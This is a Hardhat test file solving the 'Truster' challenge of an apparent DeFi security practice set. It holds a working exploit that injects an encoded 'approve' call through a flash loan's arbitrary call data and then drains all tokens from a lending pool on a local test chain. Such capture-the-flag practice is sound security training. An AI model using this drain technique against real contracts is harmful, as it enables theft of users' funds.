const { ethers } = require("hardhat");
const { expect } = require("chai");
const { getTheAbi } = require("../00-utils/getAbi");
//update it with your own path if needed
const damnValuableTokenAbiPath =
  "../../artifacts/contracts/DamnValuableToken.sol/DamnValuableToken.json";

describe("[Challenge] Truster", function () {
  let deployer, attacker;

  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const DamnValuableToken = await ethers.getContractFactory(
      "DamnValuableToken",
      deployer
    );
    const TrusterLenderPool = await ethers.getContractFactory(
      "TrusterLenderPool",
      deployer
    );

    this.token = await DamnValuableToken.deploy();
    this.pool = await TrusterLenderPool.deploy(this.token.address);

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

    expect(await this.token.balanceOf(this.pool.address)).to.equal(
      TOKENS_IN_POOL
    );

    expect(await this.token.balanceOf(attacker.address)).to.equal("0");
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE  */
    /* you can attack this challenge using another smart contract or by computing
     * payload offchain*/

    const onChainAttack = false;
    if (onChainAttack) {
      const TrusterAttacker = await ethers.getContractFactory(
        "TrusterAttacker",
        attacker
      );

      this.trusterAttacker = await TrusterAttacker.deploy();
      await this.trusterAttacker.attack(
        this.pool.address,
        this.token.address,
        attacker.address,
        TOKENS_IN_POOL
      );
    } else {
      const damnValuableTokenAbi = getTheAbi(damnValuableTokenAbiPath);
      const damnValuableTokenIface = new ethers.utils.Interface(
        damnValuableTokenAbi
      );

      const data = damnValuableTokenIface.encodeFunctionData("approve", [
        attacker.address,
        TOKENS_IN_POOL,
      ]);
      // get the loan and inject the 'approve' data into 'functionCall'
      await this.pool.flashLoan(0, attacker.address, this.token.address, data);
    }

    // connect pool contract to attacker signer
    const untrustedToken = this.token.connect(attacker);
    await untrustedToken.transferFrom(
      this.pool.address,
      attacker.address,
      TOKENS_IN_POOL
    );
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(attacker.address)).to.equal(
      TOKENS_IN_POOL
    );
    expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
  });
});
